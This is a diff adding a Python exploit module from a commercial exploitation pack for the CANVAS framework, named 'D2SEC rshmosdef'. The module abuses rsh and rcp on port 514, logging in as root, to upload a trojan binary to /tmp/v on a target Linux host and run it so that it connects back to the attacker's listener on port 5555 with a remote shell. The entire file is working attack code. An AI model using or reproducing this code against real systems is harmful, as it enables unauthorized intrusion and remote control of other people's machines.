@@ -1,0 +1,162 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007
+#
+
+import os,getopt
+import sys
+sys.path.append(".")
+
+import socket
+from exploitutils import *
+
+from canvasengine import *
+from canvasexploit import canvasexploit
+from stat import *
+
+from MOSDEFShellServer import MSSgeneric
+
+
+NAME = "D2SEC rshmosdef"
+DESCRIPTION = "Run a mosdef trojan via a rsh session"
+DOCUMENTATION = {}
+DOCUMENTATION["Notes"] = """
+You need only select a connect back target and start a listener, d2sec_rshmosdef does all the work.
+"""
+
+VERSION="0.1"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Tool"
+PROPERTY['ARCH'] = [ ["Linux", "i386"] ]
+
+TARGETS = {
+	0 : ["Linux i386", "v_linux_i386"],
+#	1 : ["Solaris i386", "v_solaris_i386"],
+#	2 : ["Solaris SPARC", "v_solaris_sparc"],
+}
+
+class theexploit(canvasexploit):
+	def __init__(self):
+		canvasexploit.__init__(self)
+		self.name = NAME
+		self.host = "127.0.0.1"
+		self.port = 514 
+		self.cbackport = 5555
+		self.luser = "root"
+		self.ruser = "root"
+		self.passwd = ""
+		self.version = 0
+		self.dest = "/tmp/v"
+		self.interface = None
+		return
+    
+	def rcp(self):
+		bin = "3rdparty/D2SEC/exploits/d2sec_rshmosdef/%s" % TARGETS[self.version][1]
+		size_bin = os.stat(bin)[ST_SIZE]
+
+		self.log("Connecting to %s:%d to rcp file"%(self.host,self.port))
+		self.s = self.gettcpsock()
+		self.s.bind((self.interface.ip, 1023))
+		try:
+			self.s.connect((self.host, int(self.port)))
+		except:
+			self.log("Could not connect!")
+			return 1
+
+		buf = s_binary("00")
+		self.s.sendall(buf)
+
+		buf = self.luser
+		buf += s_binary("00")
+		buf += self.ruser
+		buf += s_binary("00")
+		buf += "rcp -t %s" % self.dest
+		buf += s_binary("00")
+
+		self.s.sendall(buf)
+		self.s.recv(1)
+		self.s.recv(1)
+
+		buf = "C0755 %s %s\n" % (size_bin, bin)
+		self.s.sendall(buf)
+		self.s.recv(1)
+
+		f = open(bin, "r")
+		df = f.read()
+		f.close()
+
+		self.log(bin)
+		self.s.sendall(df)
+			
+		buf = s_binary("00")
+		self.s.sendall(buf)
+
+		self.s.close()
+
+		return 0
+	
+	def rsh(self):
+		self.log("Connecting to %s:%d to execute remote file"%(self.host,self.port))
+		self.s = self.gettcpsock()
+		self.s.bind((self.interface.ip, 1023))
+		try:
+			self.s.connect((self.host, int(self.port)))
+		except:
+			self.log("Could not connect!")
+			return 1
+
+		buf = "1022"
+		buf += s_binary("00")
+		self.s.sendall(buf)
+
+		buf = self.luser
+		buf += s_binary("00")
+		buf += self.ruser
+		buf += s_binary("00")
+		buf += "%s %s 5555" % (self.dest, self.interface)
+		buf += s_binary("00")
+
+		self.s.sendall(buf)
+		self.s.recv(1)
+
+		self.s.close()
+		return 0
+
+	def getargs(self):
+		self.host = self.target.interface
+		self.port = int(self.argsDict.get("port",self.port))
+		self.luser = self.argsDict.get("luser",self.luser)
+		self.ruser = self.argsDict.get("ruser",self.ruser)
+		self.passwd = self.argsDict.get("passwd",self.passwd)
+		self.dest = self.argsDict.get("dest",self.dest)
+       
+	def run(self):
+		self.setInfo("%s attacking %s:%d"%(NAME,self.host,self.port))
+		self.getargs()
+
+		self.interface = self.engine.get_callback_interface()
+
+		if not self.dest:
+			self.log("Desination file not specified")
+			self.setInfo("%s (failed)"%(NAME))
+			return
+
+		i = self.rcp()
+		if i == 1:
+			self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
+			return
+
+		i = self.rsh()
+		if i == 1:
+			self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
+			return
+
+		self.setInfo("%s (finished)"%(NAME))
+
+if __name__ == '__main__':
+	print "This module is meant to be run only within CANVAS"
